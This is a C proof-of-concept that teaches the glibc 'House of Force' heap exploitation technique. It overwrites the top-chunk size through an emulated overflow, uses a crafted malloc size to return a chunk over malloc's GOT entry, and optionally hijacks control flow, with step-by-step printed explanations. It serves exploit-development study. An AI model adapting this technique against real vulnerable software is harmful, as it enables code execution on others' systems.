/*

 This PoC works also with ASLR enabled.
 It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.
 If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum 
 ( http://phrack.org/issues/66/10.html )
 
 Tested with Ubuntu 32 bits.

*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

//#define SIGSEV 

int main(int argc , char* argv[]){

	char overflow_data[265] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"\
				  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"\
				  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"\
				  "AA\xff\xff\xff\xff";
	
	if(argc < 2){
		printf("I need the address of the malloc entry in the GOT in order to start the PoC\nRun 'objdump -R house_of_force' and provide in input the address of malloc\n");
		exit(0);
	}

	unsigned int malloc_got_address = strtoul(argv[1],NULL,16);
	malloc_got_address -= 8; //later explanation of this 

	printf("\nWelcome to the House of Force\n\n");
	
	printf("Let's allocate the first chunk right over the Top Chunk\n");
	unsigned int p1 = (unsigned int)malloc(256);
	printf("The chunk of 256 bytes has been allocated here 0x%08x\n",p1);

	printf("Now let's emulate a vulnerability that can overwrite the header of the Top Chunk\n");

	//----- VULNERABILITY ----
	memcpy((void *)p1,overflow_data,264); 
	//------------------------

	printf("Now let's guess the next address that malloc should return\n");
	printf("The address should be the previous address returned p1 + the size allocated before + the header of the new allocted chunk\n");
	printf("p2_guessed = p1 + 256 +8\n");
	unsigned int p2_guessed = p1 + 256 + 8;  

	printf("p2_guessed is 0x%08x\n",p2_guessed);

	printf("Now that we have overflowed the Top Chunk header with a size of 0xffffffff we simulate an attacker\ncontrolled malloc() with a very big size\n\n");
	printf("This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n");
	printf("This because the main_arena->top pointer is setted to current av->top + malloc_size and we \nwant to set this result to the address of malloc_got_address-8\n\n");
	printf("In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n");
	printf("The av->top after this big malloc will be setted in this way to malloc_got_address-8\n\n");
	printf("After that a new call to malloc will return av->top+8 ( +8 bytes for the header ),\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n");

	unsigned int evil_size = malloc_got_address - p2_guessed;

	unsigned int p2 = (unsigned int)malloc(evil_size);  
	printf("The large chunk with evil_size has been allocated here 0x%08x\n",p2);
	printf("The main_arena value av->top has been setted to malloc_got_address-8=0x%08x\n",malloc_got_address);
	
	printf("This last malloc will be served from the remainder code and will return the av->top+8 injected before\n");
	
	unsigned int p3 = (unsigned int)malloc(1024); 

	printf("\np3 is 0x%08x and should be equal to malloc_got_address = 0x%08x\n\n",p3,malloc_got_address+8);

	printf("Now:\nmemcpy(p3,\"\x41\x41\x41\x41\",4);\nmalloc(58);\nSIGSEV with eip=0x41414141\n\n");

#ifdef SIGSEV
	memcpy((void *)p3,"\x41\x41\x41\x41",4);
	malloc(58);  //hijacked
#endif
}
